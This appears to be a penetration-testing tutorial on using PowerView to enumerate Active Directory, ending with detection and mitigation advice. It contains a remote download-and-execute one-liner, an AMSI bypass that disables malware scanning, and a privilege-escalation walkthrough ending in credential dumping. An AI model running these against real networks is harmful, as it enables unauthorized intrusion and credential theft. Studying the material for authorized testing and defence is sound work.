# 🔍 PowerView — Active Directory Enumeration with PowerShell

**PowerView** is a PowerShell-based tool (part of **PowerSploit/SharpSploit**) used for Active Directory reconnaissance and enumeration. It allows attackers and penetration testers to gather detailed information about users, groups, computers, GPOs, trusts, and ACLs — all from a domain-joined workstation.

> PowerView is one of the most important tools in a red teamer's arsenal because it operates using built-in Windows protocols (LDAP) and is harder to detect than external tools.

---

## 🧠 Why PowerView Is Powerful

* Uses native Windows LDAP queries
* No need for additional binaries
* Runs in memory (fileless)
* Extensive enumeration capabilities
* Helps identify attack paths manually (before BloodHound)

---

## 🛠 Getting PowerView

### Download and Import

```powershell
# Download
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')

# Or load from disk
Import-Module .\PowerView.ps1
```

### Bypass Execution Policy (if needed)

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

### AMSI Bypass (if Defender blocks it)

```powershell
# Basic AMSI bypass (for lab environments only)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## 📊 Domain Enumeration

### Get Domain Information

```powershell
Get-Domain
```

Output: Domain name, forest, DC, domain SID.

### Get Domain Controller

```powershell
Get-DomainController
```

### Get Domain SID

```powershell
Get-DomainSID
```

### Get Domain Policy (Password Policy)

```powershell
Get-DomainPolicyData
```

Shows: Password length, lockout threshold, complexity requirements.

---

## 👤 User Enumeration

### List All Domain Users

```powershell
Get-DomainUser | Select-Object samaccountname, description, memberof
```

### Find Specific User

```powershell
Get-DomainUser -Identity "jsmith"
```

### Find Users with Admin in Name

```powershell
Get-DomainUser -Identity "*admin*" | Select-Object samaccountname
```

### Find Users with SPN (Kerberoastable)

```powershell
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```

### Find Users with No Pre-Auth (AS-REP Roastable)

```powershell
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
```

### Find Accounts with Passwords Never Expiring

```powershell
Get-DomainUser -UACFilter DONT_EXPIRE_PASSWORD | Select-Object samaccountname
```

### Find Accounts with Password in Description

```powershell
Get-DomainUser | Where-Object { $_.description -match "pass" } | Select-Object samaccountname, description
```

---

## 👥 Group Enumeration

### List All Domain Groups

```powershell
Get-DomainGroup | Select-Object samaccountname
```

### Find Domain Admins

```powershell
Get-DomainGroupMember -Identity "Domain Admins"
```

### Find Enterprise Admins

```powershell
Get-DomainGroupMember -Identity "Enterprise Admins"
```

### Find All Groups a User Belongs To

```powershell
Get-DomainGroup -UserName "jsmith" | Select-Object samaccountname
```

### Find Nested Group Memberships

```powershell
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

---

## 💻 Computer Enumeration

### List All Domain Computers

```powershell
Get-DomainComputer | Select-Object dnshostname, operatingsystem
```

### Find Domain Controllers

```powershell
Get-DomainComputer -SearchBase "OU=Domain Controllers,DC=corp,DC=local"
```

### Find Servers

```powershell
Get-DomainComputer -OperatingSystem "*Server*" | Select-Object dnshostname, operatingsystem
```

### Find Computers with Unconstrained Delegation

```powershell
Get-DomainComputer -Unconstrained | Select-Object dnshostname
```

---

## 📂 Share Enumeration

### Find All Accessible Shares

```powershell
Find-DomainShare -CheckShareAccess
```

### Find Interesting Files on Shares

```powershell
Find-InterestingDomainShareFile -Include *.txt,*.ps1,*.bat,*.config,*.xml
```

### Find Shares with "password" in Files

```powershell
Find-InterestingDomainShareFile -Include *.txt | Select-String "password"
```

---

## 🔐 ACL / Permission Enumeration

### Find Objects Where User Has Interesting Rights

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {
    $_.IdentityReferenceName -match "jsmith"
}
```

### Check ACLs on a Specific User

```powershell
Get-DomainObjectAcl -Identity "Administrator" -ResolveGUIDs |
    Where-Object { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner" }
```

### Find All Users with DCSync Rights

```powershell
Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs |
    Where-Object { $_.ObjectAceType -match "Replicating" }
```

---

## 🏗 GPO Enumeration

### List All GPOs

```powershell
Get-DomainGPO | Select-Object displayname, gpcfilesyspath
```

### Find GPOs Applied to Specific Computer

```powershell
Get-DomainGPO -ComputerIdentity "WS01" | Select-Object displayname
```

### Find GPOs That Modify Local Group Memberships

```powershell
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
```

---

## 🌐 Trust Enumeration

### List All Domain Trusts

```powershell
Get-DomainTrust
```

### List Forest Trusts

```powershell
Get-ForestTrust
```

### Map All Trusts

```powershell
Get-DomainTrustMapping
```

---

## 🔍 Session & Logon Enumeration

### Find Where a User is Logged In

```powershell
Find-DomainUserLocation -UserIdentity "domainadmin"
```

### Find Sessions on a Specific Computer

```powershell
Get-NetSession -ComputerName "fileserver"
```

### Find Logged-On Users on a Computer

```powershell
Get-NetLoggedon -ComputerName "WS01"
```

---

## 🔥 Attack Scenario Using PowerView

### Scenario: From Zero to Domain Admin

1. **Import PowerView** on compromised workstation:

   ```powershell
   Import-Module .\PowerView.ps1
   ```

2. **Get domain info**:

   ```powershell
   Get-Domain
   ```

3. **Find Domain Admins**:

   ```powershell
   Get-DomainGroupMember -Identity "Domain Admins"
   ```

4. **Find where DA is logged in**:

   ```powershell
   Find-DomainUserLocation -UserIdentity "domainadmin"
   ```

   Result: `domainadmin` is logged into `WS05`.

5. **Check if current user is local admin on WS05**:

   ```powershell
   Find-LocalAdminAccess
   ```

6. **If yes** → access WS05 → dump credentials → get DA hash.

7. **If no** → enumerate ACLs for privilege escalation paths:

   ```powershell
   Find-InterestingDomainAcl -ResolveGUIDs
   ```

---

## 📊 PowerView Quick Reference Table

| Task | Command |
| --- | --- |
| Domain info | `Get-Domain` |
| Domain users | `Get-DomainUser` |
| Domain admins | `Get-DomainGroupMember -Identity "Domain Admins"` |
| Kerberoastable users | `Get-DomainUser -SPN` |
| AS-REP roastable | `Get-DomainUser -PreauthNotRequired` |
| All computers | `Get-DomainComputer` |
| Find shares | `Find-DomainShare` |
| Find DA sessions | `Find-DomainUserLocation` |
| Check local admin | `Find-LocalAdminAccess` |
| Domain trusts | `Get-DomainTrust` |
| GPOs | `Get-DomainGPO` |
| ACLs | `Get-DomainObjectAcl` |

---

## 🛡 Detection & Mitigation

### 🔎 Detection

* Monitor for **large LDAP query volumes** from workstations
* **Event ID 4662** — Directory Service Access from unusual sources
* Detect PowerShell script execution (Script Block Logging)
* **Event ID 4104** — PowerShell Script Block Logging

### 🔐 Mitigation

✅ Enable **PowerShell Script Block Logging**
✅ Enable **Constrained Language Mode**
✅ Use **AMSI** (Anti-Malware Scan Interface)
✅ Deploy **AppLocker** or **WDAC** to restrict PowerShell
✅ Monitor LDAP query patterns
✅ Limit user permissions (least privilege)

---

## ⚠ Ethical Reminder

Everything discussed:

* Legal only in authorized labs
* Legal with written penetration testing authorization
* Illegal otherwise

---

## 📚 What to Learn Next

* 🩸 BloodHound automated path discovery
* 🔄 Combining PowerView with lateral movement
* 🛡 Active Directory hardening best practices
* 🧪 AD lab setup for practicing enumeration
